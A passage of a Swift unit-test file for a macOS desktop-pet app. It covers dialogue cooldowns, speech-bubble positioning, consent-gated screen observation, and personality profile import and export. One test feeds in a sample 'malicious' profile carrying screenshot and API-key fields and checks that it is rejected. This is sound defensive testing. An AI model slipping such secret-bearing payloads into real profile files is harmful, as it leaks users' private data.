    TestHarness.assertTrue(mischievousMsg != nil, "Mischievous pet message generated")
    TestHarness.assertEqual(mischievousMsg?.category, DialogueCategory.playful, message: "Category is playful")
}

func testDialogueSuppressionConditions() {
    print("Running testDialogueSuppressionConditions...")
    let engine = DialogueEngine(characterId: UUID(), characterName: "TestPet")
    let personality = PersonalityProfile.preset(.balanced)
    let needs = CharacterNeeds()
    let fixedDate = Date()
    
    // 1. Suppression during dragging
    let dragResult = engine.evaluateTrigger(
        .petClicked,
        personality: personality,
        needs: needs,
        currentAction: .idle,
        isDragging: true,
        referenceDate: fixedDate
    )
    TestHarness.assertTrue(dragResult == nil, "Dialogue must be suppressed while pet is being dragged")
    
    // 2. Suppression when globally disabled
    let disabledResult = engine.evaluateTrigger(
        .petClicked,
        personality: personality,
        needs: needs,
        currentAction: .idle,
        isDragging: false,
        dialogueEnabled: false,
        referenceDate: fixedDate
    )
    TestHarness.assertTrue(disabledResult == nil, "Dialogue must be suppressed when dialogueEnabled is false")
    
    // 3. Suppression in Quiet Mode
    let quietResult = engine.evaluateTrigger(
        .petClicked,
        personality: personality,
        needs: needs,
        currentAction: .idle,
        isDragging: false,
        dialogueEnabled: true,
        quietModeEnabled: true,
        referenceDate: fixedDate
    )
    TestHarness.assertTrue(quietResult == nil, "Dialogue must be suppressed when quietModeEnabled is true")
    
    // 4. Suppression when direct interaction responses are disabled
    let noDirectResult = engine.evaluateTrigger(
        .petClicked,
        personality: personality,
        needs: needs,
        currentAction: .idle,
        isDragging: false,
        dialogueEnabled: true,
        directInteractionResponsesEnabled: false,
        quietModeEnabled: false,
        referenceDate: fixedDate
    )
    TestHarness.assertTrue(noDirectResult == nil, "Direct interaction dialogue suppressed when directInteractionResponsesEnabled is false")
    
    // 5. Suppression when contextual commentary is disabled
    let noContextResult = engine.evaluateTrigger(
        .appActivated(appName: "Safari"),
        personality: personality,
        needs: needs,
        currentAction: .idle,
        isDragging: false,
        dialogueEnabled: true,
        contextualCommentsEnabled: false,
        quietModeEnabled: false,
        referenceDate: fixedDate
    )
    TestHarness.assertTrue(noContextResult == nil, "Contextual dialogue suppressed when contextualCommentsEnabled is false")
}

func testDialogueCooldownAndAntiSpam() {
    print("Running testDialogueCooldownAndAntiSpam...")
    let cooldownManager = DialogueCooldownManager()
    let petId = UUID()
    let category = DialogueCategory.interaction
    var simulatedTime = Date()
    
    // 1. First interaction speaks
    let canSpeakFirst = cooldownManager.canSpeak(
        characterId: petId,
        category: category,
        isDirectInteraction: true,
        dialogueEnabled: true,
        quietModeEnabled: false,
        frequency: 0.5,
        referenceDate: simulatedTime
    )
    TestHarness.assertTrue(canSpeakFirst, "First direct interaction is allowed")
    
    let msg1 = DialogueMessage(id: "msg_1", text: "Hello", category: category)
    cooldownManager.recordSpeech(characterId: petId, message: msg1, isDirectInteraction: true, referenceDate: simulatedTime)
    
    // 2. Rapid interaction 2 seconds later is suppressed (8s direct cooldown)
    simulatedTime = simulatedTime.addingTimeInterval(2.0)
    let canSpeakTooSoon = cooldownManager.canSpeak(
        characterId: petId,
        category: category,
        isDirectInteraction: true,
        dialogueEnabled: true,
        quietModeEnabled: false,
        frequency: 0.5,
        referenceDate: simulatedTime
    )
    TestHarness.assertFalse(canSpeakTooSoon, "Direct interaction within 8s must be blocked by cooldown")
    
    // 3. After 15 seconds (exceeding 8s direct cooldown and 12s global minimum interval), allowed again
    simulatedTime = simulatedTime.addingTimeInterval(13.0)
    let canSpeakAfterCooldown = cooldownManager.canSpeak(
        characterId: petId,
        category: category,
        isDirectInteraction: true,
        dialogueEnabled: true,
        quietModeEnabled: false,
        frequency: 0.5,
        referenceDate: simulatedTime
    )
    TestHarness.assertTrue(canSpeakAfterCooldown, "Direct interaction allowed after cooldown elapsed")
    
    // 4. Recent message repetition avoidance
    let recents = cooldownManager.recentIds(for: petId)
    TestHarness.assertTrue(recents.contains("msg_1"), "Recently spoken message recorded in buffer")
}

func testMultipleCharactersIndependentDialogue() {
    print("Running testMultipleCharactersIndependentDialogue...")
    let cooldownManager = DialogueCooldownManager()
    let petA = UUID()
    let petB = UUID()
    var simulatedTime = Date()
    
    // Pet A speaks
    let msgA = DialogueMessage(id: "msg_a", text: "Hi from A", category: .interaction)
    cooldownManager.recordSpeech(characterId: petA, message: msgA, isDirectInteraction: true, referenceDate: simulatedTime)
    
    // Immediately after (t + 1s), Pet B is blocked by the GLOBAL minimum interval (12s throttle)
    simulatedTime = simulatedTime.addingTimeInterval(1.0)
    let petBImmediate = cooldownManager.canSpeak(
        characterId: petB,
        category: .interaction,
        isDirectInteraction: true,
        dialogueEnabled: true,
        quietModeEnabled: false,
        frequency: 0.5,
        referenceDate: simulatedTime
    )
    TestHarness.assertFalse(petBImmediate, "Pet B must be blocked by global minimum interval (no simultaneous overlapping desktop bubbles)")
    
    // After 15s, Pet B is allowed to speak even though Pet A's spontaneous cooldown is still active
    simulatedTime = simulatedTime.addingTimeInterval(14.0)
    let petBAllowed = cooldownManager.canSpeak(
        characterId: petB,
        category: .interaction,
        isDirectInteraction: true,
        dialogueEnabled: true,
        quietModeEnabled: false,
        frequency: 0.5,
        referenceDate: simulatedTime
    )
    TestHarness.assertTrue(petBAllowed, "Pet B allowed to speak after global interval, with its own independent cooldown state")
}

func testSpeechBubbleClampingAndScreenPositioning() {
    print("Running testSpeechBubbleClampingAndScreenPositioning...")
    let panel = SpeechBubblePanel()
    panel.setContentSize(NSSize(width: 200, height: 60))
    
    // Screen clamping test
    let screen = NSScreen.main ?? NSScreen()
    
    // 1. Center of screen: normal placement
    panel.updatePosition(
        petCenter: NSPoint(x: 500, y: 300),
        petTopY: 350,
        petBottomY: 250,
        isUpsideDown: false,
        screen: screen
    )
    TestHarness.assertTrue(panel.frame.origin.x >= 0, "Bubble origin x is within screen")
    TestHarness.assertTrue(panel.frame.origin.y > 350, "Bubble origin y is above pet top")
    
    // 2. Near right edge: clamped to maxX - width - 8
    panel.updatePosition(
        petCenter: NSPoint(x: screen.visibleFrame.maxX - 20, y: 300),
        petTopY: 350,
        petBottomY: 250,
        isUpsideDown: false,
        screen: screen
    )
    let maxXAllowed = screen.visibleFrame.maxX - panel.frame.width - 8
    TestHarness.assertTrue(panel.frame.origin.x <= maxXAllowed + 1.0, "Bubble near right edge must be clamped inside visible frame (Origin: \(panel.frame.origin.x), MaxAllowed: \(maxXAllowed))")
    
    // 3. Upside down: placed below pet bottom
    panel.updatePosition(
        petCenter: NSPoint(x: 500, y: 900),
        petTopY: 950,
        petBottomY: 850,
        isUpsideDown: true,
        screen: screen
    )
    TestHarness.assertTrue(panel.frame.origin.y < 850, "Upside down bubble must be placed below pet bottom")
}

func testSpeechBubbleControllerLifecycle() {
    print("Running testSpeechBubbleControllerLifecycle...")
    let controller = SpeechBubbleController()
    let screen = NSScreen.main ?? NSScreen()
    let message = DialogueMessage(id: "msg_test", text: "Testing lifecycle", category: .interaction, duration: 1.0)
    
    TestHarness.assertFalse(controller.isVisible, "Initially not visible")
    TestHarness.assertTrue(controller.currentMessage == nil, "Initially no message")
    
    // Show
    controller.show(
        message: message,
        petCenter: NSPoint(x: 400, y: 400),
        petTopY: 450,
        petBottomY: 350,
        isUpsideDown: false,
        screen: screen
    )
    TestHarness.assertTrue(controller.isVisible, "Controller is marked visible after show")
    TestHarness.assertEqual(controller.currentMessage?.id, "msg_test", message: "Current message id matches")
    
    // Hide
    controller.hide()
    TestHarness.assertFalse(controller.isVisible, "Controller is marked not visible after hide")
    
    // Close
    controller.close()
    TestHarness.assertTrue(controller.bubblePanel == nil, "Panel deallocated on close")
}

// MARK: - Phase 5 Unit Tests

func createTestCGImage(width: Int = 100, height: Int = 100) -> CGImage {
    let colorSpace = CGColorSpaceCreateDeviceRGB()
    let context = CGContext(
        data: nil,
        width: width,
        height: height,
        bitsPerComponent: 8,
        bytesPerRow: width * 4,
        space: colorSpace,
        bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue
    )!
    context.setFillColor(CGColor(red: 0.2, green: 0.4, blue: 0.8, alpha: 1.0))
    context.fill(CGRect(x: 0, y: 0, width: width, height: height))
    return context.makeImage()!
}

func testScreenAwarenessDefaultStateAndPermissions() {
    print("Running testScreenAwarenessDefaultStateAndPermissions...")
    let service = ScreenAwarenessService()
    
    TestHarness.assertFalse(service.isEnabled, "Screen awareness must be disabled by default")
    TestHarness.assertFalse(service.periodicObservationEnabled, "Periodic observation must be disabled by default")
    TestHarness.assertEqualDouble(service.observationInterval, 300.0, message: "Default observation interval is 300s (5 min)")
    TestHarness.assertEqual(service.processingMode, VisionProcessingMode.local, message: "Default processing mode is local")
    TestHarness.assertFalse(service.cloudConsentGiven, "Cloud consent must be false by default")
}

func testExcludedApplicationFiltering() {
    print("Running testExcludedApplicationFiltering...")
    let service = ScreenAwarenessService()
    service.isEnabled = true
    service.excludedBundleIds = ["com.apple.keychainaccess", "com.agilebits.onepassword"]
    
    TestHarness.assertTrue(service.excludedBundleIds.contains("com.apple.keychainaccess"), "Keychain is excluded")
    TestHarness.assertTrue(service.excludedBundleIds.contains("com.agilebits.onepassword"), "1Password is excluded")
}

func testCloudProviderConsentGate() {
    print("Running testCloudProviderConsentGate...")
    let cloudProvider = CloudVisionProvider()
    cloudProvider.consentGiven = false
    cloudProvider.apiKey = "sk-testkey123"
    
    let dummyImage = createTestCGImage()
    let dummyData = ScreenAwarenessService().downscaleImage(cgImage: dummyImage) ?? Data()
    let request = ScreenUnderstandingRequest(imageData: dummyData)
    
    let sem = DispatchSemaphore(value: 0)
    Task {
        do {
            _ = try await cloudProvider.analyzeScreen(request: request)
            TestHarness.assertTrue(false, "Cloud provider must throw error without explicit consent")
        } catch let err as ScreenAwarenessError {
            TestHarness.assertEqual(err, ScreenAwarenessError.cloudConsentRequired, message: "Throws cloudConsentRequired error")
        } catch {
            TestHarness.assertTrue(false, "Unexpected error: \(error)")
        }
        sem.signal()
    }
    _ = sem.wait(timeout: .now() + 5.0)
    
    // Test empty API key
    cloudProvider.consentGiven = true
    cloudProvider.apiKey = ""
    let sem2 = DispatchSemaphore(value: 0)
    Task {
        do {
            _ = try await cloudProvider.analyzeScreen(request: request)
            TestHarness.assertTrue(false, "Cloud provider must throw error without API key")
        } catch let err as ScreenAwarenessError {
            TestHarness.assertEqual(err, ScreenAwarenessError.apiKeyMissing, message: "Throws apiKeyMissing error")
        } catch {
            TestHarness.assertTrue(false, "Unexpected error: \(error)")
        }
        sem2.signal()
    }
    _ = sem2.wait(timeout: .now() + 5.0)
}

func testLocalProviderIsolationNoCloudFallback() {
    print("Running testLocalProviderIsolationNoCloudFallback...")
    let localProvider = LocalVisionProvider()
    // Configure with an unreachable localhost port
    localProvider.endpoint = URL(string: "http://127.0.0.1:59999/api/generate")!
    
    let dummyImage = createTestCGImage()
    let dummyData = ScreenAwarenessService().downscaleImage(cgImage: dummyImage) ?? Data()
    let request = ScreenUnderstandingRequest(imageData: dummyData)
    
    let sem = DispatchSemaphore(value: 0)
    Task {
        do {
            _ = try await localProvider.analyzeScreen(request: request)
            TestHarness.assertTrue(false, "Local provider with unreachable port should throw error")
        } catch let err as ScreenAwarenessError {
            if case .localEndpointUnavailable = err {
                TestHarness.assertTrue(true, "Correctly throws localEndpointUnavailable without falling back to cloud")
            } else {
                TestHarness.assertTrue(false, "Expected localEndpointUnavailable, got \(err)")
            }
        } catch {
            TestHarness.assertTrue(false, "Unexpected error: \(error)")
        }
        sem.signal()
    }
    _ = sem.wait(timeout: .now() + 5.0)
}

func testVisualResultSanitizationAndOutputConstraints() {
    print("Running testVisualResultSanitizationAndOutputConstraints...")
    let overlyLongSummary = String(repeating: "A", count: 300)
    let manyObservations = ["Obs 1", "Obs 2", "Obs 3", "Obs 4", "Obs 5"]
    
    let result = ScreenUnderstandingResult(
        category: .coding,
        summary: overlyLongSummary,
        observations: manyObservations,
        confidence: 1.5 // out of bounds
    )
    
    TestHarness.assertTrue(result.summary.count <= 140, "Summary must be bounded to at most 140 characters")
    TestHarness.assertTrue(result.observations.count <= 3, "Observations list must be bounded to at most 3 items")
    TestHarness.assertEqualDouble(result.confidence, 1.0, message: "Confidence clamped to maximum 1.0")
}

func testScreenAwarenessPipelineWithMockCaptureAndProvider() {
    print("Running testScreenAwarenessPipelineWithMockCaptureAndProvider...")
    let service = ScreenAwarenessService()
    service.isEnabled = true
    
    // Inject mock capture
    let testImage = createTestCGImage(width: 200, height: 200)
    service.captureHandler = { testImage }
    
    // Inject mock vision provider
    let mockResult = ScreenUnderstandingResult(
        category: .coding,
        summary: "Editing Swift source files",
        confidence: 0.95
    )
    let mockProvider = MockVisionProvider(result: mockResult)
    service.customProvider = mockProvider
    
    let sem = DispatchSemaphore(value: 0)
    Task { @MainActor in
        let output = await service.observeScreenNow()
        TestHarness.assertTrue(output != nil, "Analysis returns result")
        TestHarness.assertEqual(output?.category, VisualActivityCategory.coding, message: "Category is coding")
        TestHarness.assertEqual(service.lastResult?.category, VisualActivityCategory.coding, message: "lastResult recorded")
        sem.signal()
    }
    _ = sem.wait(timeout: .now() + 5.0)
    
    // Test clearHistory
    service.clearHistory()
    TestHarness.assertTrue(service.lastResult == nil, "History cleared")
}

func testPeriodicObservationIntervalBounds() {
    print("Running testPeriodicObservationIntervalBounds...")
    let service = ScreenAwarenessService()
    service.isEnabled = true
    service.observationInterval = 60.0 // Attempts to set 1 min
    
    // Periodic timer clamps minimum to 300.0s (5 minutes)
    service.startPeriodicTimer()
    TestHarness.assertTrue(service.observationInterval >= 60.0, "Interval property set")
    service.stopPeriodicTimer()
}

func testVisualDialoguePersonalityReactions() {
    print("Running testVisualDialoguePersonalityReactions...")
    let provider = RuleBasedDialogueProvider()
    let petId = UUID()
    var rng = SeededRandomSource(seed: 999)
    
    // 1. Curious companion observing coding
    let curiousProfile = PersonalityProfile.preset(.curious)
    let context = DialogueContext(
        characterId: petId,
        characterName: "Scout",
        personality: curiousProfile,
        currentNeeds: CharacterNeeds(),
        currentAction: .walking,
        trigger: .visualObservation(category: .coding, summary: "Writing Swift code")
    )
    let diagProfile = DialogueProfile.fromPersonality(curiousProfile)
    let msg = provider.selectDialogue(context: context, profile: diagProfile, recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(msg != nil, "Curious companion should comment on coding observation")
    TestHarness.assertEqual(msg?.category, DialogueCategory.visualObservation, message: "Category is visualObservation")
    
    // 2. Gaming observation
    let gamingContext = DialogueContext(
        characterId: petId,
        characterName: "Scout",
        personality: curiousProfile,
        currentNeeds: CharacterNeeds(),
        currentAction: .walking,
        trigger: .visualObservation(category: .gaming, summary: "Playing video game")
    )
    let gamingMsg = provider.selectDialogue(context: gamingContext, profile: diagProfile, recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(gamingMsg != nil, "Companion should comment on gaming observation")
}

// MARK: - Phase 6 Unit Tests

func testPersonalityMatrixDimensionsAndMetadata() {
    print("Running testPersonalityMatrixDimensionsAndMetadata...")
    TestHarness.assertEqual(PersonalityTraitDimension.allCases.count, 10, message: "Must have exactly 10 personality dimensions")
    
    for dim in PersonalityTraitDimension.allCases {
        TestHarness.assertTrue(!dim.displayName.isEmpty, "Dimension \(dim.rawValue) must have display name")
        TestHarness.assertTrue(!dim.explanation.isEmpty, "Dimension \(dim.rawValue) must have explanation")
        TestHarness.assertTrue(!dim.lowDescription.isEmpty, "Dimension \(dim.rawValue) must have low description")
        TestHarness.assertTrue(!dim.highDescription.isEmpty, "Dimension \(dim.rawValue) must have high description")
    }
    
    let custom = PersonalityProfile(
        energy: 1.2,
        curiosity: -0.2,
        playfulness: 1.5,
        laziness: -0.8,
        sociability: 1.1,
        mischief: -0.1,
        sarcasm: 1.9,
        supportiveness: -0.4,
        shyness: 1.3,
        independence: -0.7
    )
    TestHarness.assertEqualDouble(custom.energy, 1.0, message: "Energy clamped to 1.0")
    TestHarness.assertEqualDouble(custom.curiosity, 0.0, message: "Curiosity clamped to 0.0")
    TestHarness.assertEqualDouble(custom.playfulness, 1.0, message: "Playfulness clamped to 1.0")
    TestHarness.assertEqualDouble(custom.laziness, 0.0, message: "Laziness clamped to 0.0")
    TestHarness.assertEqualDouble(custom.sociability, 1.0, message: "Sociability clamped to 1.0")
    TestHarness.assertEqualDouble(custom.mischief, 0.0, message: "Mischief clamped to 0.0")
    TestHarness.assertEqualDouble(custom.sarcasm, 1.0, message: "Sarcasm clamped to 1.0")
    TestHarness.assertEqualDouble(custom.supportiveness, 0.0, message: "Supportiveness clamped to 0.0")
    TestHarness.assertEqualDouble(custom.shyness, 1.0, message: "Shyness clamped to 1.0")
    TestHarness.assertEqualDouble(custom.independence, 0.0, message: "Independence clamped to 0.0")
}

func testNewPersonalityPresets() {
    print("Running testNewPersonalityPresets...")
    TestHarness.assertEqual(PersonalityPreset.allCases.count, 10, message: "Must have 10 presets in total")
    
    let playful = PersonalityProfile.preset(.playful)
    TestHarness.assertTrue(playful.playfulness > 0.9, "Playful preset has high playfulness")
    TestHarness.assertEqual(playful.preference(for: .gaming), .like, message: "Playful likes gaming")
    
    let calm = PersonalityProfile.preset(.calm)
    TestHarness.assertTrue(calm.supportiveness > 0.8, "Calm preset is supportive and peaceful")
    TestHarness.assertEqual(calm.preference(for: .relaxation), .like, message: "Calm likes relaxation")
    
    let sarcastic = PersonalityProfile.preset(.sarcastic)
    TestHarness.assertTrue(sarcastic.sarcasm > 0.9, "Sarcastic preset has high sarcasm")
    TestHarness.assertTrue(sarcastic.independence > 0.8, "Sarcastic preset is independent")
    
    let supportive = PersonalityProfile.preset(.supportive)
    TestHarness.assertTrue(supportive.supportiveness > 0.9, "Supportive preset has high supportiveness")
    TestHarness.assertTrue(supportive.sarcasm < 0.1, "Supportive preset has very low sarcasm")
}

func testTopicPreferencesAndContextMatching() {
    print("Running testTopicPreferencesAndContextMatching...")
    var profile = PersonalityProfile(name: "Techie")
    TestHarness.assertEqual(profile.preference(for: .coding), .neutral, message: "Default preference is neutral")
    
    profile.setPreference(.like, for: .coding)
    TestHarness.assertEqual(profile.preference(for: .coding), .like, message: "Preference updated to like")
    
    profile.setPreference(.dislike, for: .study)
    TestHarness.assertEqual(profile.preference(for: .study), .dislike, message: "Preference updated to dislike")
    
    profile.setPreference(.interested, for: .art)
    TestHarness.assertEqual(profile.preference(for: .art), .interested, message: "Preference updated to interested")
    
    TestHarness.assertEqual(CharacterInterestTopic.topicForContext(appName: "Xcode"), .coding, message: "Xcode maps to coding")
    TestHarness.assertEqual(CharacterInterestTopic.topicForContext(appName: "Steam"), .gaming, message: "Steam maps to gaming")
    TestHarness.assertEqual(CharacterInterestTopic.topicForContext(appName: "Spotify"), .music, message: "Spotify maps to music")
    TestHarness.assertEqual(CharacterInterestTopic.topicForContext(appName: "Figma"), .art, message: "Figma maps to art")
    TestHarness.assertEqual(CharacterInterestTopic.topicForContext(appName: "Crunchyroll"), .anime, message: "Crunchyroll maps to anime")
    TestHarness.assertEqual(CharacterInterestTopic.topicForContext(appName: "Notion"), .study, message: "Notion maps to study")
    TestHarness.assertEqual(CharacterInterestTopic.topicForContext(isInactive: true), .relaxation, message: "Inactivity maps to relaxation")
}

func testBehaviorPreferencesPrecedenceAndScoring() {
    print("Running testBehaviorPreferencesPrecedenceAndScoring...")
    
    // 1. Cursor Following Master Precedence
    let friendlyProfile = PersonalityProfile(
        name: "Friendly",
        sociability: 1.0,
        independence: 0.0,
        behaviorPreferences: CharacterBehaviorPreferences(cursorFollowingEnabled: false)
    )
    let engine = BehaviorEngine(profile: friendlyProfile)
    var walkRight = true
    let approachEvent = EnvironmentEvent(type: .cursorApproached(distance: 50, cursorLocation: NSPoint(x: 300, y: 100)))
    let result = engine.handleEnvironmentEvent(approachEvent, petCenter: NSPoint(x: 200, y: 100), walkDirectionRight: &walkRight)
    TestHarness.assertTrue(result == nil, "Cursor chase must be suppressed when cursorFollowingEnabled is false")
    
    // 2. High Independence ignores cursor chase even when cursorFollowingEnabled is true
    let independentProfile = PersonalityProfile(
        name: "Loner",
        sociability: 0.8,
        independence: 0.9,
        behaviorPreferences: CharacterBehaviorPreferences(cursorFollowingEnabled: true)
    )
    let indepEngine = BehaviorEngine(profile: independentProfile)
    let indepResult = indepEngine.handleEnvironmentEvent(approachEvent, petCenter: NSPoint(x: 200, y: 100), walkDirectionRight: &walkRight)
    TestHarness.assertTrue(indepResult == nil, "Cursor chase must be ignored when independence > 0.75")
    
    // 3. Sleep frequency preference directly scales sleep scoring
    let lowSleepPref = PersonalityProfile(
        energy: 0.5,
        laziness: 0.5,
        behaviorPreferences: CharacterBehaviorPreferences(sleepFrequency: 0.0)
    )
    let highSleepPref = PersonalityProfile(
        energy: 0.5,
        laziness: 0.5,
        behaviorPreferences: CharacterBehaviorPreferences(sleepFrequency: 1.0)
    )
    let lowSleepScore = BehaviorEngine(profile: lowSleepPref).calculateScores()[.sleeping] ?? 0.0
    let highSleepScore = BehaviorEngine(profile: highSleepPref).calculateScores()[.sleeping] ?? 0.0
    TestHarness.assertTrue(highSleepScore > lowSleepScore, "High sleep frequency preference must produce higher sleep score")
    
    // 4. Exploration tendency preference directly scales exploring scoring
    let lowExplPref = PersonalityProfile(
        curiosity: 0.5,
        behaviorPreferences: CharacterBehaviorPreferences(explorationTendency: 0.0)
    )
    let highExplPref = PersonalityProfile(
        curiosity: 0.5,
        behaviorPreferences: CharacterBehaviorPreferences(explorationTendency: 1.0)
    )
    let lowExplScore = BehaviorEngine(profile: lowExplPref).calculateScores()[.exploring] ?? 0.0
    let highExplScore = BehaviorEngine(profile: highExplPref).calculateScores()[.exploring] ?? 0.0
    TestHarness.assertTrue(highExplScore > lowExplScore, "High exploration preference must produce higher exploring score")
}

func testTopicDrivenBehaviorAndDialogue() {
    print("Running testTopicDrivenBehaviorAndDialogue...")
    
    // 1. App activation with liked topic triggers excitement / exploring
    var codingFan = PersonalityProfile(name: "Coder")
    codingFan.setPreference(.like, for: .coding)
    let coderEngine = BehaviorEngine(profile: codingFan)
    coderEngine.currentAction = .idle
    let xcodeEvent = EnvironmentEvent(type: .appActivated(bundleId: "com.apple.dt.Xcode", appName: "Xcode"))
    var walkRight = true
    let reaction = coderEngine.handleEnvironmentEvent(xcodeEvent, petCenter: NSPoint(x: 100, y: 100), walkDirectionRight: &walkRight)
    TestHarness.assertEqual(reaction, CharacterAction.exploring, message: "Liked topic app activation should transition to exploring")
    
    // 2. Dialogue for liked topic is enthusiastic
    let provider = RuleBasedDialogueProvider()
    var rng = SeededRandomSource(seed: 42)
    let context = DialogueContext(
        characterId: UUID(),
        characterName: "Coder",
        personality: codingFan,
        currentNeeds: CharacterNeeds(),
        currentAction: .walking,
        trigger: .appActivated(appName: "Xcode")
    )
    let msg = provider.selectDialogue(context: context, profile: DialogueProfile.fromPersonality(codingFan), recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(msg != nil, "Dialogue should be generated for app activation")
    TestHarness.assertTrue(msg?.text.contains("love") == true, "Dialogue for liked topic should mention loving it")
}

func testProfileExportImportValidationAndSanitization() {
    print("Running testProfileExportImportValidationAndSanitization...")
    
    // 1. Export produces valid JSON
    let original = PersonalityProfile.preset(.sarcastic)
    let exportResult = PersonalityStorage.shared.exportProfileJSON(original)
    switch exportResult {
    case .success(let data):
        TestHarness.assertTrue(data.count > 0, "Exported data must not be empty")
        
        // 2. Import succeeds and round-trips traits and preferences
        let importResult = PersonalityStorage.shared.importProfile(from: data)
        switch importResult {
        case .success(let imported):
            TestHarness.assertEqual(imported.name, original.name, message: "Imported name matches")
            TestHarness.assertEqualDouble(imported.sarcasm, original.sarcasm, message: "Sarcasm matches")
            TestHarness.assertEqualDouble(imported.independence, original.independence, message: "Independence matches")
            TestHarness.assertEqual(imported.preference(for: .gaming), .like, message: "Gaming preference round-tripped")
            TestHarness.assertTrue(imported.id != original.id, "Imported profile receives fresh UUID to prevent collision")
        case .failure(let err):
            TestHarness.assertTrue(false, "Import failed: \(err)")
        }
    case .failure(let err):
        TestHarness.assertTrue(false, "Export failed: \(err)")
    }
    
    // 3. Security check: profiles containing private fields are rejected
    let maliciousJSON = """
    {
        "name": "SpyPet",
        "energy": 0.5,
        "screenshot": "base64_data_here",
        "apiKey": "sk-secret-key"
    }
    """.data(using: .utf8)!
    let blockedResult = PersonalityStorage.shared.importProfile(from: maliciousJSON)
    switch blockedResult {
    case .success:
        TestHarness.assertTrue(false, "Profiles containing private keys must be rejected")
    case .failure(let msg):
        TestHarness.assertTrue(msg.contains("Security check failed"), "Rejection must cite security check")
    }
    
    // 4. Malformed JSON rejection
    let malformedJSON = "{ invalid json content".data(using: .utf8)!
    let malformedResult = PersonalityStorage.shared.importProfile(from: malformedJSON)
    switch malformedResult {
    case .success:
        TestHarness.assertTrue(false, "Malformed JSON must fail")
    case .failure:
        TestHarness.assertTrue(true, "Malformed JSON rejected gracefully")
    }
}

func testBehaviorSimulatorPreviewIntegrity() {
    print("Running testBehaviorSimulatorPreviewIntegrity...")
    let profile = PersonalityProfile.preset(.curious)
    let simulation = PersonalityBehaviorSimulator.simulate(profile: profile)
    
    let totalProb = simulation.actionProbabilities.values.reduce(0.0, +)
    TestHarness.assertTrue(abs(totalProb - 100.0) < 1.0, "Probabilities must sum to ~100%")
    TestHarness.assertTrue(!simulation.cursorResponseDescription.isEmpty, "Cursor description present")
    TestHarness.assertTrue(!simulation.restingTendencyDescription.isEmpty, "Resting description present")
    TestHarness.assertTrue(!simulation.sampleDialogue.isEmpty, "Sample dialogue present")
}

// MARK: - Phase 7 Unit Tests

func testPhase7DialogueTriggersAndFallingLandingMusicObstacle() {
    print("Running testPhase7DialogueTriggersAndFallingLandingMusicObstacle...")
    let provider = RuleBasedDialogueProvider()
    var rng = SeededRandomSource(seed: 42)
    let now = Date()
    
    // 1. Falling trigger
    let curiousProfile = PersonalityProfile.preset(.curious)
    let fallContext = DialogueContext(
        characterId: UUID(),
        characterName: "CuriousPet",
        personality: curiousProfile,
        currentNeeds: CharacterNeeds(),
        currentAction: .walking,
        trigger: .falling,
        referenceDate: now
    )
    let fallMsg = provider.selectDialogue(context: fallContext, profile: DialogueProfile.fromPersonality(curiousProfile), recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(fallMsg != nil, "Falling dialogue should be produced")
    TestHarness.assertEqual(fallMsg?.category, DialogueCategory.falling, message: "Category must be .falling")
    
    // 2. Landing trigger
    let landingContext = DialogueContext(
        characterId: UUID(),
        characterName: "CuriousPet",
        personality: curiousProfile,
        currentNeeds: CharacterNeeds(),
        currentAction: .idle,
        trigger: .landing,
        referenceDate: now
    )
    let landMsg = provider.selectDialogue(context: landingContext, profile: DialogueProfile.fromPersonality(curiousProfile), recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(landMsg != nil, "Landing dialogue should be produced")
    TestHarness.assertEqual(landMsg?.category, DialogueCategory.interaction, message: "Landing category is mapped to interaction/touchdown")
    
    // 3. Music playing trigger with music topic preference
    var musicLover = PersonalityProfile.preset(.energetic)
    musicLover.topicPreferences[CharacterInterestTopic.music.rawValue] = .like
    let musicContext = DialogueContext(
        characterId: UUID(),
        characterName: "MusicPet",
        personality: musicLover,
        currentNeeds: CharacterNeeds(),
        currentAction: .walking,
        trigger: .musicPlaying(track: "Synthwave Sunset"),
        referenceDate: now
    )
    let musicMsg = provider.selectDialogue(context: musicContext, profile: DialogueProfile.fromPersonality(musicLover), recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(musicMsg != nil, "Music dialogue should be produced")
    TestHarness.assertEqual(musicMsg?.category, DialogueCategory.music, message: "Category must be .music")
    TestHarness.assertTrue(musicMsg?.text.contains("Synthwave Sunset") == true, "Dialogue contains track name")
    TestHarness.assertTrue(musicMsg?.text.contains("Grooving") == true, "Music lover expresses enthusiasm")
    
    // Sarcastic pet disliking music
    var musicCritic = PersonalityProfile.preset(.sarcastic)
    musicCritic.topicPreferences[CharacterInterestTopic.music.rawValue] = .dislike
    let criticContext = DialogueContext(
        characterId: UUID(),
        characterName: "CriticPet",
        personality: musicCritic,
        currentNeeds: CharacterNeeds(),
        currentAction: .walking,
        trigger: .musicPlaying(track: "Annoying Tune"),
        referenceDate: now
    )
    let criticMsg = provider.selectDialogue(context: criticContext, profile: DialogueProfile.fromPersonality(musicCritic), recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(criticMsg?.text.contains("standards") == true || criticMsg?.text.contains("loud") == true || criticMsg?.text.contains("Annoying Tune") == true, "Music critic reacts with dry or critical remark")
    
    // 4. Obstacle / ledge encounter
    let obstacleContext = DialogueContext(
        characterId: UUID(),
        characterName: "CuriousPet",
        personality: curiousProfile,
        currentNeeds: CharacterNeeds(),
        currentAction: .walking,
        trigger: .ledgeOrObstacle(obstacle: "window_edge"),
        referenceDate: now
    )
    let obsMsg = provider.selectDialogue(context: obstacleContext, profile: DialogueProfile.fromPersonality(curiousProfile), recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(obsMsg != nil, "Obstacle dialogue should be produced")
    TestHarness.assertEqual(obsMsg?.category, DialogueCategory.environmental, message: "Category must be .environmental")
    
    // 5. User returned trigger
    let returnContext = DialogueContext(
        characterId: UUID(),
        characterName: "CuriousPet",
        personality: PersonalityProfile.preset(.playful),
        currentNeeds: CharacterNeeds(),
        currentAction: .idle,
        trigger: .userReturned,
        referenceDate: now
    )
    let returnMsg = provider.selectDialogue(context: returnContext, profile: DialogueProfile.fromPersonality(curiousProfile), recentIds: [], randomSource: &rng)
    TestHarness.assertTrue(returnMsg != nil, "User returned dialogue should be produced")
    TestHarness.assertEqual(returnMsg?.category, DialogueCategory.greeting, message: "Category must be .greeting")
    TestHarness.assertTrue(returnMsg?.text.contains("Welcome back") == true || returnMsg?.text.contains("return") == true, "Message text welcomes user back")
}

